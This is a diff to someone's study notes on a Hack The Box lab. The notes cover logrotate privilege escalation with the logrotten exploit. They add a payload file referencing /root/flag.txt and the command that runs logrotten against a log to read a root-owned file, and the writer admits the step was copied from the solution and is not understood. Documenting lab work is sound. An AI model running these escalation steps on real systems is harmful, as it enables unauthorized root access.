@@ -1,3 +1,4 @@
+#review
 - Archives and or deletes old logs
 - Pulls logs from /var/log
 - Started periodically via cron
@@ -153,6 +154,23 @@ Compile the file
 gcc logrotten.c -o logrotten
 ```
 
+Found log two files in `backups` directory. Which log triggers logrotate?
+```python
+htb-student@ubuntu:~/backups$ ls -l
+total 4
+-rw-r--r-- 1 htb-student htb-student  0 May 22 10:26 access.log
+-rw-r--r-- 1 htb-student htb-student 91 May 22 10:26 access.log.1
+```
 
+**Find which log activates logrotate** 
 
+..then..
+```python
+echo "/root/flag.txt > /home/htb-student/flag.txt" > payload
+```
+
+Then execute the payload with logrotten: Looked at the solution to get this, still don't know which access log triggers logrotate
+```python
+echo test >> /home/htb-student/backups/access.log; ./logrotten /home/htb-student/backups/access.log -p payload
+```
 
